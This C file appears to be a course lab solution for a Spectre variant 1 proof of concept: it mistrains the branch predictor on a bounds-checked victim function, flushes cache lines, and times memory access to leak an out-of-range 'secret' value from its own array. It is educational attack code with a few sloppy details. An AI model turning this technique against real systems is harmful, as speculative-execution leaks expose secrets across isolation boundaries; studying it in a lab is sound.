#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <time.h>

#define BUFF_SIZE (1 << 21)
#define SHAREDMEMSETS 150
#define THRESHOLD 120
int bound = 20;
//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
void victim(int volatile *secret_array, int *shared_mem, int volatile index)
{
    int ninja;
    clflush(&bound);
    if (index < bound){
        ninja = shared_mem[secret_array[index] * 64];
    }
}

int main(int argc, char **argv)
{
    srand(time(NULL));
    // Allocate a buffer using huge page
    // See the handout for details about hFugepage management
    void *huge_page = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

    if (huge_page == (void *)-1)
    {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation

    //** STEP 1: Allocate an array into the mmap */
    int *secret_array = (int *)huge_page;
    int *shared_mem = (int *)huge_page + 1024;

    // Initialize the array
    for (int i = 0; i < 100; i++)
    {
        secret_array[i] = i;
    }

    uint64_t volatile times[SHAREDMEMSETS] = {0};

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times

    int correctIndex = 15, incorrectIndex = 64;

    // Generate a random number between 40 and 50
    int train = rand() % 11 + 40; // rand() % 11 gives a number between 0 and 10, adding 40 shifts the range to 40-50

    while (train--)
        victim(secret_array, huge_page, correctIndex);

    //** STEP 3: Clear cache using clflsuh from utility.h */

    for (int i = 0; i < SHAREDMEMSETS; i += 1)
    {
        clflush(shared_mem + i * 64);
    }

    //** STEP 4: Call victim function again with bounds bypass value */
    victim(secret_array, shared_mem, incorrectIndex);

    for (int i = 0; i < SHAREDMEMSETS; i += 1)
        times[i] = measure_one_block_access_time((uint64_t)(shared_mem + i * 64));

    for (int i = 0; i < SHAREDMEMSETS; i += 1)
        if (times[i] < THRESHOLD)
            printf("Secret is %d\n", i);

    return 0;
}
